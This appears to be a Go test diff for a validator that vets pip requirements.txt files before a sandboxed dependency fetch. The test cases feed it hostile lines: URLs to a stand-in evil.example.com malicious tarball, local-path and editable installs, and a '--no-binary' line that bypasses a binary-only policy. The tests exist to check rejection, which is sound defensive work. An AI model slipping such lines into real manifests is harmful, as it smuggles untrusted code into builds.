@@ -793,6 +793,100 @@ func TestPythonFetchRequiresSandbox(t *testing.T) {
 	}
 }
 
+// TestValidatePipRequirementsRejectsBypasses proves the bugbot-gu0o manifest
+// vetting closes three concrete --only-binary=:all: bypasses: a direct
+// URL/sdist line, a bare local-path line, and a "--no-binary" option line
+// embedded in requirements.txt (which pip honors even though it was never
+// on the CLI, silently overriding --only-binary). It also proves nested
+// -r/-c includes and editable installs are rejected (unsupported in v1) and
+// that a rejected manifest never launches a container at all — ResolveDeps
+// fails BEFORE any Prefetch hook is constructed.
+func TestValidatePipRequirementsRejectsBypasses(t *testing.T) {
+	tests := []struct {
+		name    string
+		content string
+	}{
+		{
+			name:    "direct URL sdist line",
+			content: "six==1.16.0\nhttps://evil.example.com/malicious-1.0.tar.gz\n",
+		},
+		{
+			name:    "PEP 508 direct reference",
+			content: "pkg @ https://evil.example.com/pkg-1.0.tar.gz\n",
+		},
+		{
+			name:    "bare local path line",
+			content: "six==1.16.0\n.\n",
+		},
+		{
+			name:    "absolute local path line",
+			content: "/repo/vendor/malicious-pkg\n",
+		},
+		{
+			name:    "--no-binary option line overrides CLI --only-binary",
+			content: "six==1.16.0\n--no-binary :all:\n",
+		},
+		{
+			name:    "editable install",
+			content: "-e .\n",
+		},
+		{
+			name:    "nested -r include",
+			content: "-r other-requirements.txt\n",
+		},
+		{
+			name:    "nested -c constraint include",
+			content: "-c constraints.txt\n",
+		},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			dir := t.TempDir()
+			writeFile(t, filepath.Join(dir, "requirements.txt"), tc.content)
+			cacheBase := t.TempDir()
+			mock := NewMock(MockResponse{Result: Result{ExitCode: 0}})
+
+			_, err := resolvePython(dir, DepOptions{
+				Strategy:     DepStrategyFetch,
+				FetchSandbox: mock,
+				userCacheDir: cacheBase,
+			})
+			if err == nil {
+				t.Fatalf("resolvePython should reject requirements.txt content %q", tc.content)
+			}
+			if !strings.Contains(err.Error(), "bugbot-gu0o") {
+				t.Errorf("error = %v, want a named bugbot-gu0o reason", err)
+			}
+			if mock.CallCount() != 0 {
+				t.Errorf("rejected manifest must never launch a container; CallCount() = %d", mock.CallCount())
+			}
+		})
+	}
+}
+
+// TestValidatePipRequirementsAllowsOrdinaryPins proves the validator does
+// not reject ordinary, safe requirements.txt content: index-resolved
+// name==version pins (with extras/markers) and a bare unpinned name.
+func TestValidatePipRequirementsAllowsOrdinaryPins(t *testing.T) {
+	dir := t.TempDir()
+	writeFile(t, filepath.Join(dir, "requirements.txt"),
+		"six==1.16.0\nrequests[security]>=2.0,<3.0; python_version >= \"3.8\"\npytest\n# a comment\n\n")
+	cacheBase := t.TempDir()
+	mock := NewMock(MockResponse{Result: Result{ExitCode: 0}})
+
+	res, err := resolvePython(dir, DepOptions{
+		Strategy:     DepStrategyFetch,
+		FetchSandbox: mock,
+		userCacheDir: cacheBase,
+	})
+	if err != nil {
+		t.Fatalf("resolvePython should accept an ordinary requirements.txt: %v", err)
+	}
+	if res.Prefetch == nil {
+		t.Fatal("valid requirements.txt must still set a Prefetch hook")
+	}
+}
+
 // TestMultiEcosystemComposition: a repo with both go.mod and requirements.txt
 // gets both the Go modcache mount and the Python wheelhouse mount, and the
 // merged Resolution carries Python's SetupCmds.
